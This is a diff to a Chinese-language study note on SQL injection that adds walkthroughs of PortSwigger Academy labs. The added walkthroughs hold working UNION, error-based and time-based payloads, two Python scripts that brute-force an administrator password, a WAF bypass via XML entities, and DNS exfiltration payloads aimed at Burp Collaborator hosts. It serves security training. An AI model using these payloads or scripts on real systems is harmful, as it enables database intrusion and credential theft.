@@ -118,7 +118,7 @@ SQL 注入攻擊（SQLi）是一種網路安全漏洞，允許攻擊者干擾應
 5. 點擊登入，就過關了！
 :::
 
-## 從其他資料庫資料表擷取資料
+## 從其他資料庫資料表擷取資料（UNION Attacks）
 
 在應用程式會回應 SQL 查詢語句結果的情況下，攻擊者可以利用 SQL 注入漏洞從資料庫中的其他資料表擷取資料。您可以使用 `UNION` 關鍵字執行額外的 `SELECT` 查詢語句，並將結果附加到原始查詢語句中。
 
@@ -304,6 +304,200 @@ carlos~montoya
 4. 使用 `administrator` 使用者的帳號密碼登入後通關
 :::
 
+## 檢查資料庫
+
+SQL 語言的一些核心功能在熱門資料庫平台上以相同方式實作，因此許多檢測和利用 SQL 注入漏洞的方法在不同類型的資料庫上運作方式相同。
+
+然而，常見資料庫之間也存在許多差異。這意味著一些檢測和利用 SQL 注入的技術在不同平台上的運作方式會有所不同。例如：
+
+* 字串串接的語法。
+* 註解。
+* 批次（或堆疊）查詢語句。
+* 平台特定的 API。
+* 錯誤訊息。
+
+::: info Read more
+* [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+:::
+
+在您識別出 SQL 注入漏洞後，取得資料庫相關資訊通常很有用。這些資訊可以幫助您利用該漏洞。
+
+您可以查詢資料庫的版本詳細資訊。不同的方法適用於不同的資料庫類型。這意味著如果您發現某個特定方法有效，就可以推斷出資料庫類型。例如，在 Oracle 上您可以執行：`SELECT * FROM v$version`
+
+您也可以識別存在哪些資料庫資料表，以及它們包含的欄位。例如，在大多數資料庫上您可以執行以下查詢語句來列出資料表：`SELECT * FROM information_schema.tables`
+
+要利用 SQL 注入漏洞，通常需要找出關於資料庫的資訊。這包括：
+
+* 資料庫軟體的類型和版本。
+* 資料庫包含的資料表和欄位。
+
+### 查詢資料庫類型和版本
+
+您可以透過注入特定供應商的查詢來識別資料庫類型和版本，看看哪一個有效。
+
+以下是一些針對熱門資料庫類型判斷資料庫版本的查詢：
+
+| 資料庫類型 | 查詢 |
+|-----------|------|
+| Microsoft、MySQL | `SELECT @@version` |
+| Oracle | `SELECT * FROM v$version` |
+| PostgreSQL | `SELECT version()` |
+
+例如，您可以使用以下輸入進行 `UNION` 攻擊：
+
+```sql
+' UNION SELECT @@version--
+```
+
+這可能會回傳以下輸出。在此情況下，您可以確認資料庫是 Microsoft SQL Server 並查看所使用的版本：
+
+```
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49
+Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+```
+
+::: tip Lab: [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
+
+1. 這是一個正常的請求
+    ```http
+    GET /filter?category=Gifts HTTP/2
+    Host: 0a5c000f0359c0f0807b176700d9006c.web-security-academy.net
+    ```
+2. 透過 UNION 確認共有 2 個欄位
+    ```http
+    GET /filter?category=Gifts'+UNION+SELECT+NULL+FROM+v$version-- HTTP/2
+
+    GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL+FROM+v$version-- HTTP/2
+
+    GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL+FROM+v$version-- HTTP/2
+    ```
+3. 取得版本資訊完成此 Lab
+    ```http
+    GET /filter?category=Gifts'+UNION+SELECT+BANNER,NULL+FROM+v$version-- HTTP/2
+    ```
+:::
+
+::: tip Lab: [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
+
+1. 這是一個正常的請求
+    ```http
+    GET /filter?category=Gifts HTTP/2
+    Host: 0a7a00c203eaccac80ea12d400be0036.web-security-academy.net
+    ```
+2. 嘗試取得版本資訊，回應狀態碼 500
+    ```http
+    GET /filter?category=Gifts'+UNION+SELECT+@@version# HTTP/2
+    ```
+3. 增加欄位至回應狀態碼 200，取得版本資訊完成此 Lab
+    ```http
+    GET /filter?category=Gifts'+UNION+SELECT+@@version,NULL# HTTP/2
+    ```
+:::
+
+### 列出資料庫內容
+
+大多數資料庫類型（Oracle 除外）都有一組稱為資訊結構描述 (information schema) 的檢視表。這提供了關於資料庫的資訊。
+
+例如，您可以查詢 `information_schema.tables` 來列出資料庫中的資料表：
+
+```sql
+SELECT * FROM information_schema.tables
+```
+
+這會回傳類似以下的輸出：
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo          Products    BASE TABLE
+MyDatabase     dbo          Users       BASE TABLE  
+MyDatabase     dbo          Feedback    BASE TABLE
+```
+
+此輸出表示有三個資料表，分別稱為 `Products`、`Users` 和 `Feedback`。
+
+然後您可以查詢 `information_schema.columns` 來列出個別資料表中的欄位：
+
+```sql
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+這會回傳類似以下的輸出：
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo          Users       UserId       int
+MyDatabase     dbo          Users       Username     varchar
+MyDatabase     dbo          Users       Password     varchar
+```
+
+此輸出顯示了指定資料表中的欄位以及每個欄位的資料類型。
+
+::: tip Lab: [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
+
+1. 這是一個正常的請求，然而依據題意這裡存在 SQLi 漏洞：
+    ```http
+    GET /filter?category=Gifts HTTP/2
+    ```
+2. 先查看有哪些 table 並判斷欄位數量：
+    ```http
+    GET /filter?category=Gifts'+UNION+SELECT+table_name+FROM+information_schema.tables-- HTTP/2 -> 500
+
+    GET /filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- HTTP/2 -> 200
+    ```
+3. 找到一個叫做 `users_qtpjug` 的 table，接著查看該 table 有哪些 column
+    ```http
+    GET /filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_qtpjug'-- HTTP/2
+    ```
+4. 找到兩個 column：`username_unbxis`、`password_xpgyxb`，將其資料擷取出來：
+    ```http
+    GET /filter?category=Gifts'+UNION+SELECT+username_unbxis,password_xpgyxb+FROM+users_qtpjug-- HTTP/2
+    ```
+5. 成功取得 administrator 的密碼，使用取得的密碼登入後完成此 Lab。
+:::
+
+### 列出 Oracle 資料庫內容
+
+在 Oracle 中，您可以透過以下方式找到相同的資訊：
+
+* 您可以透過查詢 `all_tables` 來列出資料表：
+
+```sql
+SELECT * FROM all_tables
+```
+
+* 您可以透過查詢 `all_tab_columns` 來列出欄位：
+
+```sql
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+```
+
+::: tip Lab: [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
+
+1. 這是一個正常的請求，依據題意此處存在 SQLi 漏洞：
+    ```http
+    GET /filter?category=Pets HTTP/2
+    ```
+2. 擷取所有 table 的名稱並判斷欄位數量
+    ```http
+    GET /filter?category=Pets'+UNION+SELECT+table_name+FROM+all_tables-- HTTP/2 -> 500
+
+    GET /filter?category=Pets'+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/2 -> 200
+    ```
+3. 找到一個 table 名為 `USERS_NAGZJG`，接著擷取此 table 的 column 有哪些：
+    ```http
+    GET /filter?category=Pets'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_NAGZJG'-- HTTP/2
+    ```
+4. 找到兩個 column：`USERNAME_AGYXUN`、`PASSWORD_FYHIWX`，發送請求列出所有帳號密碼：
+    ```http
+    GET /filter?category=Pets'+UNION+SELECT+USERNAME_AGYXUN,PASSWORD_FYHIWX+FROM+USERS_NAGZJG-- HTTP/2
+    ```
+5. 成功取得 administrator 的密碼，透過取得的密碼登入後完成此 Lab。
+:::
+
 ## 盲注 SQL 注入漏洞
 
 許多 SQL 注入實例都是盲注漏洞。這意味著應用程式不會在其回應中返回 SQL 查詢語句的結果或任何資料庫錯誤的詳細資訊。盲注漏洞仍然可以被利用來存取未經授權的資料，但所涉及的技術通常更複雜且更難執行。
@@ -480,7 +674,310 @@ xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 
 使用此技術，您可以透過一次測試一個字元來擷取資料：`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
 
-有不同的方式來觸發條件錯誤，不同的技術在不同的資料庫類型上效果最佳。更多詳細資訊請參閱 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)。。
+有不同的方式來觸發條件錯誤，不同的技術在不同的資料庫類型上效果最佳。更多詳細資訊請參閱 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)。
+
+::: tip Lab: [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+
+1. 這是一個正常的請求，根據題意，Cookie 的 TrackingId 值存在 SQL Injection 漏洞
+    ```http
+    GET /product?productId=3 HTTP/2
+    Host: 0a3800c303fac50a80ac080700870089.web-security-academy.net
+    Cookie: TrackingId=LqcMUIEREyrxNatY; session=NW9pXJXJeKgB5JmJ14U4EOhoz6T4aZQ2
+    Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "macOS"
+    Accept-Language: en-US,en;q=0.9
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a3800c303fac50a80ac080700870089.web-security-academy.net/
+    Accept-Encoding: gzip, deflate, br
+    Priority: u=0, i
+
+    ```
+2. 在後方加入一個引號回應狀態碼 500，驗證 SQLi 可行性
+    ```http
+    Cookie: TrackingId=LqcMUIEREyrxNatY';
+    ```
+3. 使用 Error-based 確認密碼 administrator 的密碼長度
+    ```http
+    Cookie: TrackingId=LqcMUIEREyrxNatY'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';
+    ```
+4. 當嘗試到 19 的時候，仍然回應狀態碼 500，直到長度大於 20 時，才回應狀態碼 200，由此可知密碼長度為 20。
+5. 寫 Exploit 取得 administrator 的密碼：
+    ```python=
+    import requests
+    import urllib3
+
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    cookies = {
+        'TrackingId': "LqcMUIEREyrxNatY'||(SELECT CASE WHEN SUBSTR(password,1,1)='' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
+        'session': 'NW9pXJXJeKgB5JmJ14U4EOhoz6T4aZQ2',
+    }
+
+    headers = {
+        'Host': '0a42006e03aa9e8d80150876003e0090.web-security-academy.net',
+    }
+
+    params = {
+        'productId': '3',
+    }
+
+    payload_list = ''
+
+    for i in range(ord('a'), ord('z') + 1):
+        payload_list += chr(i)
+
+    for i in range(ord('A'), ord('Z') + 1):
+        payload_list += chr(i)
+
+    for i in range(ord('0'), ord('9') + 1):
+        payload_list += chr(i)
+
+    ans = ''
+
+    for i in range(1, 20 + 1):
+        for j in payload_list:
+            cookies['TrackingId'] = f"LqcMUIEREyrxNatY'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{j}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+            
+            response = requests.get(
+                'https://0a42006e03aa9e8d80150876003e0090.web-security-academy.net/product',
+                params=params,
+                cookies=cookies,
+                headers=headers,
+                verify=False,
+            )
+
+            print(f"\rIndex = {i}, Payload = {j}   ", end='')
+
+            if response.status_code == 500:
+                ans += j
+                print()
+                print(ans)
+                break
+
+    print(f"Password: {ans}")
+    ```
+6. 取得 administrator 密碼：t7azel0rda4zj943749q 並登入完成此 Lab
+:::
+
+##### 透過詳細的 SQL 錯誤訊息提取敏感資料
+
+資料庫的錯誤配置有時會導致詳細的錯誤訊息。這些訊息可能為攻擊者提供有用的資訊。例如，考慮以下錯誤訊息，該訊息在將單引號注入 `id` 參數後出現：
+
+```raw
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+```
+
+這顯示了應用程式使用我們輸入所建構的完整查詢語句。我們可以看到在此情況下，我們正在向 `WHERE` 語句中的單引號字串進行注入。這使得構造包含惡意載荷的有效查詢變得更加容易。註解掉查詢的其餘部分可以防止多餘的單引號破壞語法。
+
+有時候，您可能能夠誘導應用程式產生包含查詢回傳部分資料的錯誤訊息。這有效地將原本的盲注 SQL 注入漏洞轉變為可見的漏洞。
+
+您可以使用 `CAST()` 函數來實現這一點。它能讓您將一種資料類型轉換為另一種。例如，想像一個包含以下語句的查詢：
+
+```sql
+CAST((SELECT example_column FROM example_table) AS int)`
+```
+
+通常，您試圖讀取的資料是字串。嘗試將其轉換為不相容的資料類型（如 `int`）可能會導致類似以下的錯誤：
+
+```raw
+ERROR: invalid input syntax for type integer: "Example data"
+```
+
+如果字元限制阻止您觸發條件回應，這種類型的查詢也可能很有用。
+
+::: tip Lab: [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
+
+1. 這是一個正常的請求，根據題意，Cookie 的 TrackingId 值存在 SQL Injection 漏洞
+    ```http
+    GET /filter?category=Lifestyle HTTP/2
+    Host: 0aeb003104258035800962ea00e40016.web-security-academy.net
+    Cookie: TrackingId=kSB5ROxwLmJAfNBr; session=KRrIXPibQL2ZYvaF8HZNwPudtJ3l8Jqi
+    Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "macOS"
+    Accept-Language: en-US,en;q=0.9
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0aeb003104258035800962ea00e40016.web-security-academy.net/filter?category=Accessories
+    Accept-Encoding: gzip, deflate, br
+    Priority: u=0, i
+
+    ```
+2. 將 TrackingId 改成以下 Payload 即可透過錯誤訊息取得第一個使用者的密碼（通常是管理者帳號）
+    ```http
+    Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) --;
+    ```
+3. 在回應的錯誤訊息中取得密碼：`0jbcieuccfdu9ozttjyk`
+4. 嘗試登入 `administrator`/`0jbcieuccfdu9ozttjyk` 完成此 Lab。
+:::
+
+#### 透過觸發時間延遲來利用盲注 SQL 注入
+
+如果應用程式在執行 SQL 查詢時捕獲資料庫錯誤並優雅地處理這些錯誤，應用程式的回應就不會有任何差異。這意味著先前用於誘導條件錯誤的技術將無法運作。
+
+在這種情況下，通常可以透過根據注入條件是真或假來觸發時間延遲，從而利用盲注 SQL 注入漏洞。由於 SQL 查詢通常由應用程式同步處理，延遲 SQL 查詢的執行也會延遲 HTTP 回應。這讓您可以根據接收 HTTP 回應所需的時間來判斷注入條件的真偽。
+
+觸發時間延遲的技術特定於所使用的資料庫類型。例如，在 Microsoft SQL Server 上，您可以使用以下方式來測試條件並根據表達式是否為真來觸發延遲：
+
+```sql
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+
+* 第一個輸入不會觸發延遲，因為條件 `1=2` 為假。
+* 第二個輸入會觸發 10 秒的延遲，因為條件 `1=1` 為真。
+
+使用這種技術，我們可以透過一次測試一個字元來檢索資料：
+
+```sql
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+```
+
+::: info Note
+
+在 SQL 查詢中有各種觸發時間延遲的方法，不同的技術適用於不同類型的資料庫。更多詳細資訊，請參閱 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)。
+:::
+
+::: tip Lab: [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
+
+1. 題目要求讓 SQL 等待 10 秒，並且在 Cookie 的 `TrackingId` 值存在 SQLi 漏洞。
+2. 將 Cookie 改成以下 Payload 完成此 Lab
+    ```http
+    Cookie: TrackingId=LlFw3Xi6O2cEsigP'||pg_sleep(10)--;
+    ```
+:::
+
+::: tip Lab: [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
+
+1. 依據題目說明，Cookie 的 `TrackingId` 存在 SQLi
+2. 測試可透過時間等待判斷條件式
+    ```http
+    Cookie: TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--;
+
+    Cookie: TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--;
+    ```
+3. 判斷密碼長度共 20 個字元
+    ```http
+    Cookie: TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;
+
+    ...
+
+    Cookie: TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;
+
+    Cookie: TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;
+    ```
+4. 寫程式取得 administrator 的密碼並繳交完成此 Lab：
+    ```python
+    import requests as re
+    from time import time
+
+    chars = []
+
+    for i in range(97,122+1):
+        chars.append(chr(i))
+
+    for i in range(0,10):
+        chars.append(str(i))
+
+    headers = {
+        'Host': '0a35000c04985190808b627b00d90035.web-security-academy.net',
+        'Cookie': "TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;"
+        }
+
+    ans = ''
+
+    for i in range(1, 20+1):
+        for j in chars:
+            headers['Cookie'] = f"TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{j}')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;"
+
+            start_time = time()
+            receive = re.get('https://0a35000c04985190808b627b00d90035.web-security-academy.net/', headers=headers)
+            end_time = time()
+            print(f"\rIndex: {i}, Payload: {j}, Time: {end_time - start_time}, Status: {receive.status_code}", end='')
+            if (end_time - start_time > 4):
+                ans += j
+                print()
+                print(ans)
+                break
+    ```
+:::
+
+#### 使用帶外 (OAST) 技術利用盲注 SQL 注入
+
+應用程式可能會執行與前面範例相同的 SQL 查詢，但會以非同步方式進行。應用程式在原始執行緒中繼續處理使用者的請求，並使用另一個執行緒來執行使用追蹤 cookie 的 SQL 查詢。該查詢仍然容易受到 SQL 注入攻擊，但到目前為止所描述的技術都不會有效。應用程式的回應不依賴於查詢回傳任何資料、資料庫錯誤的發生，或執行查詢所需的時間。
+
+在這種情況下，通常可以透過觸發對您控制的系統的帶外網路互動來利用盲注 SQL 注入漏洞。這些互動可以基於注入的條件被觸發，以逐一推斷資訊。更有用的是，資料可以直接在網路互動中被外洩。
+
+多種網路協定可用於此目的，但通常最有效的是 DNS（域名服務）。許多生產網路允許 DNS 查詢的自由出站，因為它們對生產系統的正常運作至關重要。
+
+使用帶外技術最簡單且最可靠的工具是 Burp Collaborator。這是一個提供各種網路服務（包括 DNS）自訂實作的伺服器。它允許您檢測當向易受攻擊的應用程式發送個別載荷時是否發生網路互動。Burp Suite Professional 包含一個內建客戶端，配置為可以直接與 Burp Collaborator 配合使用。更多資訊請參閱 Burp Collaborator 的文件。
+
+觸發 DNS 查詢的技術特定於所使用的資料庫類型。例如，在 Microsoft SQL Server 上可以使用以下輸入來對指定域名執行 DNS 查找：
+
+```
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+```
+
+這會導致資料庫對以下域名執行查找：
+
+```
+0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+```
+
+您可以使用 Burp Collaborator 產生唯一的子域名，並輪詢 Collaborator 伺服器以確認何時發生任何 DNS 查找。
+
+::: tip Lab: [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
+
+out-of-band 的題目都需要 Burp Suite Professional，來個好心人贊助。
+:::
+
+在確認觸發帶外互動的方法後，您就可以使用帶外通道從易受攻擊的應用程式中外洩資料。例如：
+
+```
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+```
+
+此輸入會讀取 `Administrator` 使用者的密碼，附加一個唯一的 Collaborator 子域名，並觸發 DNS 查找。此查找讓您可以查看捕獲的密碼：
+
+```
+S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+```
+
+帶外 (OAST) 技術是檢測和利用盲注 SQL 注入的強大方法，因為其成功率很高，且能夠直接在帶外通道中外洩資料。因此，即使在其他盲注利用技術確實有效的情況下，OAST 技術通常也是首選。
+
+::: info Note
+
+有各種觸發帶外互動的方法，不同的技術適用於不同類型的資料庫。更多詳細資訊，請參閱 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)。
+:::
+
+::: tip Lab: [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
+
+out-of-band again，歡迎贊助～
+:::
+
+### 如何防止盲注 SQL 注入攻擊？
+
+儘管尋找和利用盲注 SQL 注入漏洞所需的技術與一般 SQL 注入不同且更加複雜，但防止 SQL 注入所需的措施是相同的。
+
+與一般 SQL 注入一樣，盲注 SQL 注入攻擊可以透過謹慎使用參數化查詢來防止，這確保使用者輸入無法干擾預期 SQL 查詢的結構。
+
+::: info Read more
+
+* [How to prevent SQL injection](https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection)
+* [Find blind SQL injection vulnerabilities using Burp Suite's web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner)
+:::
 
 ## 二階 SQL 注入
 
@@ -491,32 +988,6 @@ xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 ![alt](./src/image6.png)
 
 二階 SQL 注入通常發生在開發者了解 SQL 注入漏洞的情況下，因此會安全地處理輸入初次放入資料庫的過程。當資料稍後被處理時，由於之前已安全地放入資料庫，因此被認為是安全的。此時，資料會以不安全的方式處理，因為開發者錯誤地認為它是可信任的。
-
-## 檢查資料庫
-
-SQL 語言的一些核心功能在熱門資料庫平台上以相同方式實作，因此許多檢測和利用 SQL 注入漏洞的方法在不同類型的資料庫上運作方式相同。
-
-然而，常見資料庫之間也存在許多差異。這意味著一些檢測和利用 SQL 注入的技術在不同平台上的運作方式會有所不同。例如：
-
-* 字串串接的語法。
-* 註解。
-* 批次（或堆疊）查詢語句。
-* 平台特定的 API。
-* 錯誤訊息。
-
-::: info Read more
-* [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-:::
-
-在您識別出 SQL 注入漏洞後，取得資料庫相關資訊通常很有用。這些資訊可以幫助您利用該漏洞。
-
-您可以查詢資料庫的版本詳細資訊。不同的方法適用於不同的資料庫類型。這意味著如果您發現某個特定方法有效，就可以推斷出資料庫類型。例如，在 Oracle 上您可以執行：`SELECT * FROM v$version`
-
-您也可以識別存在哪些資料庫資料表，以及它們包含的欄位。例如，在大多數資料庫上您可以執行以下查詢語句來列出資料表：`SELECT * FROM information_schema.tables`
-
-::: info Read more
-* [Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database)
-:::
 
 ## 不同語境中的 SQL 注入
 
@@ -532,6 +1003,26 @@ SQL 語言的一些核心功能在熱門資料庫平台上以相同方式實作�
 ```
 
 這將在傳遞給 SQL 解釋器之前在伺服器端被解碼。
+
+::: tip Lab: [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
+
+1. 這是一個查詢庫存請求的 body：
+    ```xml 
+    <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+    ```
+2. 嘗試在 storeId 注入 SQL，並發現被 WAF 擋住了
+    ```xml
+    <storeId>1 UNION SELECT NULL</storeId>
+    ```
+3. 透過 Hackvertor 套件編碼成功繞過（Extensions > Hackvertor > Encode > dec_entities/hex_entities）
+    ```xml
+    <storeId><@dec_entities>1 UNION SELECT NULL</@dec_entities></storeId>
+    ```
+4. 取得帳號密碼並提交完成此 Lab
+    ```xml
+    <storeId><@dec_entities>1 UNION SELECT username || '~' || password FROM users</@dec_entities></storeId>
+    ```
+:::
 
 ## 如何防範 SQL 注入
 
